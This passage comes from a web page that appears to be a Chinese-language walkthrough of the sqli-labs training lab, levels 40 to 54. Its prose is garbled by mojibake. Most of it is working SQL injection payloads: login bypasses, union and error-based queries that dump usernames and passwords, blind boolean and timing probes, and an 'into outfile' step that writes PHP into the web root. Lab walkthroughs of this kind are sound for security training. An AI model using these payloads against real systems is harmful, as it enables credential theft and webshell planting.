class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-40"><a href="#less-40" class="headerlink" title="less-40"></a>less-40</h2><p>é—­åˆæ–¹å¼ï¼š<code>id=(&#39;$id&#39;)</code></p><p>åŒ38ï¼Œé—­åˆæ–¹å¼ä¸åŒ</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><br><span class="hljs-comment"># æµ‹è¯•</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27;)<span class="hljs-comment">--+</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27;) <span class="hljs-keyword">and</span> sleep(<span class="hljs-number">3</span>)<span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-41"><a href="#less-41" class="headerlink" title="less-41"></a>less-41</h2><p>é—­åˆæ–¹å¼ï¼š<code>id=$id</code></p><p>æ‹¼æ¥æ–¹å¼å’Œ Less-39 ä¸€æ ·ã€‚å› ä¸ºå°‘äº†æŠ¥é”™è¾“å‡ºï¼Œæ‰€ä»¥è¿™é‡Œä¸èƒ½æŠ¥é”™æ³¨å…¥ï¼Œå…¶ä»–æ³¨å…¥æ–¹å¼ä¸€æ ·</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><br><span class="hljs-comment"># æµ‹è¯•</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span><span class="hljs-comment">--+</span><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> sleep(<span class="hljs-number">3</span>)<span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-42"><a href="#less-42" class="headerlink" title="less-42"></a>less-42</h2><p>æ¼æ´åˆ©ç”¨ç‚¹ï¼š</p><ol><li>login çš„ passwordï¼šæ²¡æœ‰è¿‡æ»¤ï¼Œå¯ä»¥è¿›è¡ŒæŠ¥é”™æ³¨å…¥</li><li>å †å æ³¨å…¥</li><li>pass_change.phpï¼šå­˜åœ¨äºŒæ¬¡æ³¨å…¥<br>å°è¯•ä¸‡èƒ½å¯†ç ï¼ˆpasswordï¼‰ï¼Œpost ä¼ å‚æ•°<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><br># æµ‹è¯•ï¼ˆurlï¼šhttp:<span class="hljs-comment">//localhost:4000/Less-42/login.phpï¼‰</span><br>login_user=admin&amp;login_password=<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">or</span> <span class="hljs-number">1</span>#&amp;mysubmit=Login<br><br># unionæ³¨å…¥<br>login_user=admin&amp;login_password=<span class="hljs-number">1</span>&#x27; union select <span class="hljs-number">1</span>,(<span class="hljs-constructor">SELECT(@<span class="hljs-params">x</span>)</span><span class="hljs-constructor">FROM(SELECT(@<span class="hljs-params">x</span>:=0x00)</span> ,(<span class="hljs-constructor">SELECT(@<span class="hljs-params">x</span>)</span><span class="hljs-constructor">FROM(<span class="hljs-params">users</span>)</span><span class="hljs-constructor">WHERE(@<span class="hljs-params">x</span>)</span><span class="hljs-constructor">IN(@<span class="hljs-params">x</span>:=CONCAT(0x20,@<span class="hljs-params">x</span>,<span class="hljs-params">username</span>,<span class="hljs-params">password</span>,0x3c62723e)</span>)))x),<span class="hljs-number">3</span>#&amp;mysubmit=Login<br><br></code></pre></td></tr></table></figure></li></ol><hr><h2 id="less-43"><a href="#less-43" class="headerlink" title="less-43"></a>less-43</h2><p>é—­åˆæ–¹å¼ï¼š<code>username=(&#39;$username&#39;)</code></p><p>å’Œ Less-42 çš„åˆ©ç”¨æ–¹å¼ä¸€è‡´ï¼Œè¿™é‡Œåªæ˜¯æ‹¼æ¥æ–¹å¼ä¸ä¸€æ ·è€Œå·²</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><br><span class="hljs-meta"># æµ‹è¯•ï¼ˆurlï¼šhttp:<span class="hljs-comment">//localhost:4000/Less-43/login.phpï¼‰</span></span><br>login_user=admin<span class="hljs-meta">&amp;login_password=1&#x27;) or 1#</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-44"><a href="#less-44" class="headerlink" title="less-44"></a>less-44</h2><p>é—­åˆæ–¹å¼ï¼š<code>username=&#39;$username&#39;</code></p><p>å’Œ Less-43 çš„åˆ©ç”¨æ–¹å¼ä¸€è‡´ï¼Œå› ä¸ºæ²¡æœ‰è¾“å‡ºæŠ¥é”™ä¿¡æ¯ï¼Œæ‰€ä»¥è¿™é‡Œå°‘äº†æŠ¥é”™æ³¨å…¥çš„åˆ©ç”¨æ–¹å¼ã€‚</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ini"><br><span class="hljs-comment"># æµ‹è¯•</span><br><span class="hljs-attr">login_user</span>=admin&amp;login_password=admin<span class="hljs-string">&#x27; #</span><br><span class="hljs-string">login_user=admin&amp;login_password=admin&#x27;</span> and sleep(<span class="hljs-number">3</span>) <span class="hljs-comment">#</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-45"><a href="#less-45" class="headerlink" title="less-45"></a>less-45</h2><p>é—­åˆæ–¹å¼ï¼š<code>username=(&#39;$username&#39;)</code></p><p>å’Œ Less-44 çš„åˆ©ç”¨æ–¹å¼ä¸€è‡´ï¼Œè¿™é‡Œåªæ˜¯æ‹¼æ¥æ–¹å¼ä¸ä¸€æ ·è€Œå·²</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ini"><br><span class="hljs-comment"># æµ‹è¯•</span><br><span class="hljs-attr">login_user</span>=admin&amp;login_password=admin<span class="hljs-string">&#x27;) #</span><br><span class="hljs-string">login_user=admin&amp;login_password=admin&#x27;</span>) and sleep(<span class="hljs-number">3</span>)<span class="hljs-comment">#</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-46"><a href="#less-46" class="headerlink" title="less-46"></a>less-46</h2><p>é—­åˆæ–¹å¼ï¼š<code>ORDER BY $id</code></p><p>å…³é”®è¯ï¼šorder byæ³¨å…¥</p><p>éªŒè¯æ–¹å¼</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs perl"><br><span class="hljs-comment"># å‡åºæ’åº</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span> asc<br><span class="hljs-comment"># é™åºæ’åº</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span> desc<br><br><span class="hljs-comment"># rand() éªŒè¯</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-keyword">rand</span>(true)<br>?<span class="hljs-keyword">sort</span>=<span class="hljs-keyword">rand</span>(false)<br><br><span class="hljs-comment"># å»¶æ—¶éªŒè¯</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-keyword">sleep</span>(<span class="hljs-number">1</span>)<br>?<span class="hljs-keyword">sort</span>=(<span class="hljs-keyword">sleep</span>(<span class="hljs-number">1</span>))<br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">sleep</span>(<span class="hljs-number">1</span>)<br><br></code></pre></td></tr></table></figure><p>æŠ¥é”™æ³¨å…¥</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs sql"><br><span class="hljs-comment"># æŠ¥é”™1</span><br>?sort=1+AND+(<span class="hljs-keyword">SELECT</span>+<span class="hljs-number">1</span>+<span class="hljs-keyword">FROM</span>+(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">COUNT</span>(*),<span class="hljs-keyword">CONCAT</span>((<span class="hljs-keyword">SELECT</span>(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">CONCAT</span>(<span class="hljs-keyword">CAST</span>(<span class="hljs-keyword">CONCAT</span>(username,<span class="hljs-keyword">password</span>)+<span class="hljs-keyword">AS</span>+<span class="hljs-built_in">CHAR</span>),<span class="hljs-number">0x7e</span>))+<span class="hljs-keyword">FROM</span>+<span class="hljs-keyword">users</span>+<span class="hljs-keyword">LIMIT</span>+<span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-keyword">FLOOR</span>(<span class="hljs-keyword">RAND</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x+<span class="hljs-keyword">FROM</span>+INFORMATION_SCHEMA.TABLES+<span class="hljs-keyword">GROUP</span>+<span class="hljs-keyword">BY</span>+x)a)<br><br><span class="hljs-comment"># æŠ¥é”™2</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">procedure</span> analyse(extractvalue(<span class="hljs-keyword">rand</span>(),<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x3a</span>,<span class="hljs-keyword">version</span>())),<span class="hljs-number">1</span>)<br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">procedure</span> analyse(extractvalue(<span class="hljs-keyword">rand</span>(),<span class="hljs-keyword">concat</span>(<span class="hljs-number">0x3a</span>,(<span class="hljs-keyword">SELECT</span>+<span class="hljs-keyword">CONCAT_WS</span>(<span class="hljs-string">&#x27;:&#x27;</span>,username,<span class="hljs-keyword">password</span>)+<span class="hljs-keyword">FROM</span>+<span class="hljs-keyword">users</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>))),<span class="hljs-number">1</span>)<br><br></code></pre></td></tr></table></figure><p>å¸ƒå°”æ³¨å…¥</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs matlab"><br>?<span class="hljs-built_in">sort</span>=<span class="hljs-built_in">rand</span>(left(database(),<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;r&#x27;</span>)<br>?<span class="hljs-built_in">sort</span>=<span class="hljs-built_in">rand</span>(left(database(),<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;s&#x27;</span>)<br><br></code></pre></td></tr></table></figure><p>å»¶æ—¶æ³¨å…¥</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><br>?sort=rand(<span class="hljs-keyword">if</span>(ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">114</span>,<span class="hljs-number">1</span>,sleep(<span class="hljs-number">1</span>)))<br>?sort=rand(<span class="hljs-keyword">if</span>(ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">115</span>,<span class="hljs-number">1</span>,sleep(<span class="hljs-number">1</span>)))<br><br></code></pre></td></tr></table></figure><p>æŸ¥è¯¢ç»“æœå¯¼å…¥æ–‡ä»¶</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&quot;/var/www/html/less46.txt&quot;</span><br><br></code></pre></td></tr></table></figure><p>å¯¼å…¥æ–‡ä»¶å†™å…¥shell</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><br>?<span class="hljs-built_in">sort</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&quot;/Users/littlechieh6/Documents/project/sqli-labs-php7/less46.php&quot;</span> <span class="hljs-keyword">lines</span> terminated <span class="hljs-keyword">by</span> <span class="hljs-number">0x3c3f70687020706870696e666f28293b3f3e</span><br><br></code></pre></td></tr></table></figure><p>å†™å…¥çš„å†…å®¹å¦‚ä¸‹</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><br><span class="xml">1 Dumb Dumb</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><span class="xml">2 Angelina Dumb</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><span class="xml">3 Dummy Dumb</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><span class="xml">4 secure Dumb</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><span class="xml">5 stupid Dumb</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><span class="xml">6 superman Dumb</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><span class="xml">7 batman Dumb</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><span class="xml">8 admin admin</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><span class="xml">9 admin1 Dumb</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><span class="xml">10 admin2 Dumb</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><span class="xml">11 admin3 Dumb</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><span class="xml">12 dhakkan Dumb</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><span class="xml">14 admin4 Dumb</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><span class="xml">15 admin&#x27;# admin</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><span class="xml">16 hello world</span><span class="php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-47"><a href="#less-47" class="headerlink" title="less-47"></a>less-47</h2><p>é—­åˆæ–¹å¼ï¼š<code>ORDER BY &#39;$id&#39;</code></p><p>å’Œ Less-46 ç›¸æ¯”ï¼Œåˆ©ç”¨æ–¹å¼ä¸å˜ï¼Œåªæ˜¯æ‹¼æ¥æ–¹å¼æ–¹å¼å˜åŒ–ï¼Œæ³¨å…¥çš„æ—¶å€™åªè¦æ­£å¸¸é—­åˆå³å¯ã€‚</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment"># éªŒè¯</span><br><br>?<span class="hljs-attribute">sort</span>=1&#x27; <span class="hljs-keyword">or</span> sleep(3)--+<br>?<span class="hljs-attribute">sort</span>=0&#x27; <span class="hljs-keyword">or</span> sleep(3)--+<br><br></code></pre></td></tr></table></figure><p>ç”±äºçŸ­è·¯ç°è±¡ï¼Œå‰ä¸€ä¸ªä¸ä¼šå‘ç”Ÿå»¶æ—¶ï¼Œåä¸€ä¸ªæœ‰æ˜æ˜¾çš„å»¶æ—¶ã€‚</p><p>æŠ¥é”™æ³¨å…¥</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br>?sort=<span class="hljs-number">0</span>&#x27; or updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>, database(), <span class="hljs-number">0x7e</span>), <span class="hljs-number">1</span>)--+<br><br></code></pre></td></tr></table></figure><hr><h2 id="less-48"><a href="#less-48" class="headerlink" title="less-48"></a>less-48</h2><p>é—­åˆæ–¹å¼ï¼š<code>order by $id</code></p><p>å’Œ Less-47 ç›¸æ¯”å°‘äº†æŠ¥é”™æ³¨å…¥ï¼Œå¸ƒå°”ã€å»¶æ—¶ç›²æ³¨ä¾ç„¶å¯ä»¥æ­£å¸¸ä½¿ç”¨ï¼Œinto outfile ä¹Ÿå¯ä»¥</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl"><br><span class="hljs-comment"># æµ‹è¯•ï¼š</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span>--+<br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">sleep</span>(<span class="hljs-number">3</span>)--+ <span class="hljs-comment"># æ— å»¶æ—¶</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">sleep</span>(<span class="hljs-number">3</span>)--+ <span class="hljs-comment"># æœ‰å»¶æ—¶</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-49"><a href="#less-49" class="headerlink" title="less-49"></a>less-49</h2><p>é—­åˆæ–¹å¼ï¼š<code>ORDER BY &#39;$id&#39;</code></p><p>å’Œ <code>Less-47</code> ç›¸æ¯”å°‘äº†æŠ¥é”™æ³¨å…¥ï¼Œå¸ƒå°”ã€å»¶æ—¶ç›²æ³¨ä¾ç„¶å¯ä»¥æ­£å¸¸ä½¿ç”¨ï¼Œ<code>into outfile</code> ä¹Ÿå¯ä»¥</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs perl"><br><span class="hljs-comment"># æµ‹è¯•</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span>        <span class="hljs-comment"># æ­£å¸¸æ’åº</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span>--+     <span class="hljs-comment"># æ­£å¸¸æ’åº</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">sleep</span>(<span class="hljs-number">3</span>)--+ <span class="hljs-comment"># æ— å»¶æ—¶</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">sleep</span>(<span class="hljs-number">3</span>)--+ <span class="hljs-comment"># æ— å»¶æ—¶</span><br><span class="hljs-comment"># è¯´æ˜é—­åˆæ–¹å¼ä¸æ˜¯ order by $id</span><br><br><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27;        # ä¸æ­£å¸¸æ’åº</span><br><span class="hljs-string">?sort=1&#x27;</span>--+     <span class="hljs-comment"># æ­£å¸¸æ’åº</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">0</span><span class="hljs-string">&#x27; or sleep(3)--+ # æœ‰å»¶æ—¶</span><br><span class="hljs-string">?sort=1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">sleep</span>(<span class="hljs-number">3</span>)--+ <span class="hljs-comment"># æ— å»¶æ—¶</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-50"><a href="#less-50" class="headerlink" title="less-50"></a>less-50</h2><p>é—­åˆæ–¹å¼ï¼š<code>ORDER BY $id</code></p><p>å’Œ Less-46 ç›¸æ¯”ï¼ŒæŸ¥è¯¢æ–¹å¼ç”± mysql_query å˜æˆäº† mysqli_multi_queryï¼Œå› æ­¤æ”¯æŒå †å æ³¨å…¥ï¼Œåœ¨æ³¨å…¥æ–¹é¢ä¼šæ›´åŠ çµæ´»ã€‚</p><p>å…³é”®ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><br>$sql=<span class="hljs-string">&quot;SELECT * FROM users ORDER BY <span class="hljs-subst">$id</span>&quot;</span>;<br><span class="hljs-comment"># å †å æ³¨å…¥ </span><br>mysqli_multi_query($con1, $sql)<br><span class="hljs-comment"># æ‰“å°é”™è¯¯</span><br>print_r(mysqli_error($con1));<br><br></code></pre></td></tr></table></figure><p>å°è¯•æ³¨å…¥</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><br># æµ‹è¯•<br>?sort=<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>, database(), <span class="hljs-number">0x7e</span>), <span class="hljs-number">1</span>)--+ <br># XPATH syntax error: <span class="hljs-string">&#x27;~security~&#x27;</span><br><br></code></pre></td></tr></table></figure><hr><h2 id="less-51"><a href="#less-51" class="headerlink" title="less-51"></a>less-51</h2><p>é—­åˆæ–¹å¼ï¼š<code>ORDER BY &#39;$id&#39;</code></p><p>å’Œ Less-50 ç›¸æ¯”åªæ˜¯æ‹¼æ¥æ–¹å¼å‘ç”Ÿäº†å˜åŒ–ï¼Œå®é™…æ³¨å…¥çš„æ—¶å€™åªéœ€åšä¸€ä¸‹å¯¹åº”çš„é—­åˆå³å¯ã€‚</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs lsl"><br>?sort=<span class="hljs-number">1</span>        # æ­£å¸¸æ’åº<br>?sort=<span class="hljs-number">1</span>--+     # æ­£å¸¸æ’åºï¼ˆ&#x27;<span class="hljs-number">1</span>--+&#x27;è¢«å¼ºåˆ¶ç±»å‹è½¬æ¢ä¸º<span class="hljs-number">1</span>ï¼‰<br>?sort=<span class="hljs-number">1</span>&#x27;       # æŠ¥é”™ï¼Œorder by &#x27;<span class="hljs-number">1</span>&#x27;&#x27;<br>?sort=<span class="hljs-number">1</span>&#x27;--+    # æ­£å¸¸æ’åºï¼ˆorder by &#x27;<span class="hljs-number">1</span>&#x27;-- &#x27;ï¼‰<br><br># æŠ¥é”™æ³¨å…¥<br>?sort=<span class="hljs-number">1</span>&#x27; and updatexml(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>, database(), <span class="hljs-number">0x7e</span>), <span class="hljs-number">1</span>)--+<br><br></code></pre></td></tr></table></figure><hr><h2 id="less-52"><a href="#less-52" class="headerlink" title="less-52"></a>less-52</h2><p>é—­åˆæ–¹å¼ï¼š<code>ORDER BY $id</code></p><p>å’Œ Less-50 æ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯å°‘äº†æŠ¥é”™æ³¨å…¥çš„åˆ©ç”¨æ–¹å¼ã€‚</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs perl"><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span>       <span class="hljs-comment"># æ­£å¸¸å›æ˜¾</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span>--+    <span class="hljs-comment"># æ­£å¸¸å›æ˜¾</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27;      # ä¸æ˜¾ç¤ºï¼ˆorder by 1&#x27;</span>ï¼Œå‡ºé”™ä½†æ˜¯æ²¡æœ‰æ˜¾ç¤ºæŠ¥é”™ä¿¡æ¯ï¼‰ <br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">1</span><span class="hljs-string">&#x27;--+   # ä¸æ˜¾ç¤ºï¼ˆorder by 1&#x27;</span>--+ï¼Œå‡ºé”™ä½†æ˜¯æ²¡æœ‰æ˜¾ç¤ºæŠ¥é”™ä¿¡æ¯ï¼‰<br><br><span class="hljs-comment"># éªŒè¯</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-number">0</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">sleep</span>(<span class="hljs-number">3</span>)--+<br><span class="hljs-comment"># æœ‰æ˜æ˜¾å»¶æ—¶</span><br><br><span class="hljs-comment"># å¸ƒå°”æ³¨å…¥</span><br>?<span class="hljs-keyword">sort</span>=<span class="hljs-keyword">rand</span>(left(database(),<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;s&#x27;</span>)<br>?<span class="hljs-keyword">sort</span>=<span class="hljs-keyword">rand</span>(left(database(),<span class="hljs-number">1</span>)&gt;<span class="hljs-string">&#x27;r&#x27;</span>)<br><br></code></pre></td></tr></table></figure><hr><h2 id="Less-53"><a href="#Less-53" class="headerlink" title="Less-53"></a>Less-53</h2><p>é—­åˆæ–¹å¼ï¼š<code>ORDER BY &#39;$id&#39;</code></p><p>å’Œ Less-51 æ˜¯ä¸€æ ·çš„ï¼Œåªæ˜¯å°‘äº†æŠ¥é”™æ³¨å…¥çš„åˆ©ç”¨æ–¹å¼ã€‚</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br>?<span class="hljs-attr">sort=1</span>        <span class="hljs-comment"># æ­£å¸¸å›æ˜¾</span><br>?<span class="hljs-attr">sort=1--+</span>     <span class="hljs-comment"># æ­£å¸¸å›æ˜¾</span><br>?<span class="hljs-attr">sort=1&#x27;</span>       <span class="hljs-comment"># ä¸æ˜¾ç¤º</span><br>?<span class="hljs-attr">sort=1&#x27;--+</span>    <span class="hljs-comment"># æ­£å¸¸æ˜¾ç¤º</span><br><br><span class="hljs-comment"># éªŒè¯</span><br>?<span class="hljs-attr">sort=1&#x27;</span> <span class="hljs-literal">or</span> sleep(<span class="hljs-number">3</span>)--+ <span class="hljs-comment"># æ— å»¶æ—¶</span><br>?<span class="hljs-attr">sort=0&#x27;</span> <span class="hljs-literal">or</span> sleep(<span class="hljs-number">3</span>)--+ <span class="hljs-comment"># æœ‰æ˜æ˜¾å»¶æ—¶</span><br><br></code></pre></td></tr></table></figure><h1 id="5-è¿›é˜¶æŒ‘æˆ˜-54-65"><a href="#5-è¿›é˜¶æŒ‘æˆ˜-54-65" class="headerlink" title="5 è¿›é˜¶æŒ‘æˆ˜(54-65)"></a>5 è¿›é˜¶æŒ‘æˆ˜(54-65)</h1><h2 id="less-54"><a href="#less-54" class="headerlink" title="less-54"></a>less-54</h2><p>é—­åˆæ–¹å¼ï¼š<code>id=&#39;$id&#39;</code></p><p>åˆ¤æ–­é—­åˆæ–¹å¼</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><br>?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27;<span class="hljs-comment">--+</span><br><br></code></pre></td></tr></table></figure><p>åˆ¤æ–­å­—æ®µæ•°</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 